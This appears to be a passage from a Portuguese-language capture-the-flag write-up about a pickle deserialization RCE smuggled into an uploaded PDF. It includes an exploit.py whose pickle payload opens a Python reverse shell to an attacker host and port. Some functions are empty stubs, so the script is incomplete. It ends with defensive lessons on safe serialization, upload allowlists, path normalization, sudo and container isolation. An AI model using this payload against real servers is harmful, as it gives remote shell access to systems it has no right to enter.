2.3 Exploit — Pickle Deserialization RCE

O exploit gera um payload pickle malicioso compactado em gzip, empacota-o dentro de um PDF crafted que abusa do encoding de fontes, e faz upload de ambos para o portal. Quando o servidor processa o PDF, o pickle é desserializado e executa o reverse shell.

Script de automação exploit.py:

import requests, subprocess, argparse, time, threading, pickle, gzip, base64
from pathlib import Path

class RCE:
    def __reduce__(self):
        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (eval, (f"__import__('os').system('{cmd}') or {{}}",))

def create_payload(lhost, lport):
    global LHOST, LPORT
    LHOST, LPORT = lhost, lport
    with gzip.open("payload.pickle.gz", "wb") as f:
        pickle.dump(RCE(), f)
    print("[*] reverse shell command staged for " + lhost + ":" + str(lport))

def upload_files(target, vhost):

    for i, path in enumerate(path_list):

def listener(port):

📝 Lições Aprendidas & Medidas Corretivas

  • Nunca desserializar objetos pickle não confiáveis: O módulo pickle executa código arbitrário por design. Recomenda-se utilizar formatos seguros como JSON ou SafeTensors para modelos de Machine Learning.
  • Validação de uploads robusta: Listas de bloqueio (blacklist) são insuficientes; utilize listas permitidas (whitelist) com validação rígida de tipo MIME e conteúdo.
  • Normalização de caminhos de arquivo: Normalizar e sanitizar caminhos antes de servir recursos para evitar bypass de traversals via parâmetros de versão (ex: @version).
  • Auditoria estrita de sudo: Scripts executados via sudo sem senha não devem processar arquivos ou diretórios acessíveis por usuários não privilegiados.
  • Isolamento de containers: Volumes compartilhados entre host e containers (como /datastore) devem ter permissões restritas e políticas de isolamento de privilégios.
